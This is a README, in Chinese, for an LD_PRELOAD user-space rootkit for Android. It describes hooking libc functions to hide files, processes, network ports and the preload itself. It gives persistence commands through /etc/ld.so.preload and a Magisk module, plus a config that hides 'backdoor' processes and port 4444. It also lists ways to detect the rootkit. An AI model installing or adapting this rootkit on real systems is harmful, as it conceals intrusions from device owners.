# ldkit

基于 `LD_PRELOAD` 的用户态 Rootkit，通过劫持 libc 函数实现文件、进程、网络连接的隐藏。

仅供安全研究与教学用途。

## 功能

- 文件隐藏 — 劫持 `readdir`/`readdir64`，过滤指定关键字的文件名
- 进程隐藏 — 过滤 `/proc` 下的 PID 目录，`ps`/`top` 看不到目标进程
- 网络连接隐藏 — 劫持 `fopen`/`fgets`，过滤 `/proc/net/tcp` 中的指定端口
- 环境变量隐藏 — 劫持 `getenv`，隐藏 `LD_PRELOAD` 自身

## 编译

需要 Android NDK r28，默认目标平台为 ARM64：

```bash
make
```

## 使用

```bash
# 推送到设备
make push

# 单次使用（只影响当前命令，关闭终端即失效）
LD_PRELOAD=/data/local/tmp/libldkit.so ls

# 全局生效（需要 root，重启后依然有效）
echo "/data/local/tmp/libldkit.so" > /etc/ld.so.preload
```

## 卸载 / 恢复

```bash
# 清空 ld.so.preload（新启动的程序不再加载 ldkit）
echo "" > /etc/ld.so.preload

# 或者直接删除
rm /etc/ld.so.preload

# 删除 .so 文件
rm /data/local/tmp/libldkit.so
```

注意：已经在运行的进程不受影响，需要重启进程或重启设备才能完全恢复。

## 持久化方案（Android）

### 方式一：/etc/ld.so.preload

```bash
# 需要 system 分区可写
mount -o remount,rw /system
echo "/data/local/tmp/libldkit.so" > /etc/ld.so.preload
mount -o remount,ro /system
```

### 方式二：Magisk 模块（推荐）

创建模块目录结构：

```
/data/adb/modules/ldkit/
├── module.prop
└── system/
    └── etc/
        └── ld.so.preload   # 内容: /data/local/tmp/libldkit.so
```

Magisk 会在启动时通过 Magic Mount 叠加到 `/system/etc/`，不修改 system 分区。

卸载时直接在 Magisk Manager 里禁用或删除模块即可。

## 配置

编辑 `config.h` 修改隐藏规则：

```c
// 隐藏文件名包含这些关键字的文件
static const char* HIDDEN_FILES[] = {
    "ldkit",
    "evil",
    NULL
};

// 隐藏命令行包含这些关键字的进程
static const char* HIDDEN_PROCS[] = {
    "ldkit",
    "backdoor",
    NULL
};

// 隐藏这些本地端口的网络连接
static const int HIDDEN_PORTS[] = {
    4444,
    5555,
    0
};
```

## 原理

`LD_PRELOAD` 让动态链接器优先加载指定的共享库。如果库中定义了与 libc 同名的函数，程序调用时会执行我们的版本而非 libc 原版。在 hook 函数内部通过 `dlsym(RTLD_NEXT, ...)` 获取真正的 libc 函数，过滤结果后返回。

## 检测方法

- 检查 `LD_PRELOAD` 环境变量和 `/etc/ld.so.preload`
- 使用静态编译的工具（不受 `LD_PRELOAD` 影响）
- 直接使用 `syscall()` 而非 libc wrapper
- 检查 `/proc/self/maps` 中是否有可疑的 .so

## 局限性

- 对静态编译的程序无效
- 对直接使用 `syscall` 指令的程序无效
- setuid 程序会忽略 `LD_PRELOAD`
- SELinux 可能阻止 `LD_PRELOAD` 生效

## License

MIT
